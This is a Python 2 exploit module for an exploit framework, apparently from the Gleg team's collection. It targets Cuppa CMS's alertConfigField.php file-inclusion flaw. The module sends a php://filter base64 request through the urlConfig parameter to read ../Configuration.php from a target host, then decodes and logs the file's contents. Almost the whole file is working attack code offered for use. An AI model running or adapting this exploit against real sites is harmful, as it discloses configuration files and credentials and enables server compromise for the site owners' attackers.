#!/usr/bin/env python
import sys
import re
import urllib

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "ef_cuppacms_afd"
INFO['DESCRIPTION'] = "Cuppa CMS Arbitrary File Disclosure"
INFO['VENDOR'] = "http://www.cuppacms.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. 
    User tainted data is used when creating the file name that will be included into the current file. 
    PHP code in this file will be evaluated, non-PHP code will be embedded to the output. 
    This vulnerability can lead to full server compromise.
    """
INFO["DOWNLOAD_LINK"] = "https://www.exploit-db.com/apps/1b81777d9126b3056b58507dd39a38e1-cuppa_cms.zip"
INFO["LINKS"] = ["https://www.exploit-db.com/exploits/25971/"]
INFO['CHANGELOG']="4 Dec, 2015. Written by Gleg team."
INFO['PATH'] = "WEB/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.127"
OPTIONS["PORT"] = 80
OPTIONS["PATH TO FILE"] = "../Configuration.php"
OPTIONS["VHOST"] = "cuppacms/"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.vuln_path = 'alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource='


    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.vhost = self.args.get("VHOST", OPTIONS["VHOST"])
        self.vhost = self.vhost if not self.vhost.endswith("/") else self.vhost[0:-1]
        self.path_to_file = self.args.get("PATH TO FILE", OPTIONS["PATH TO FILE"])
        self.url = "http://{}:{}/{}/{}{}".format(self.host, self.port, self.vhost, self.vuln_path, self.path_to_file)
        pass

    def run(self):
        #Get options from gui
        self.args()
        resp = urllib.urlopen(self.url)
        resp = resp.read()
        expr = re.compile('\w+')

        #get all words in response
        res = expr.findall(resp)

        #usually base64-encoded word has bigger lenght than usual words
        filtered = filter(lambda x: len(x) > 20, res)
        if len(filtered) == 0:
            self.log("Can't find file with this name")
            self.finish(False)
            return 1
        decoded_count = 0
        for word in filtered:
            #add missing '=' for base64 encoded word
            word += "="
            decoded = word.decode('base64')
            if decoded:
                self.log(decoded)
                decoded_count += 1
        if decoded_count == 0:
            self.log("Can't find file with this name")
            self.finish(False)
            return 1
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
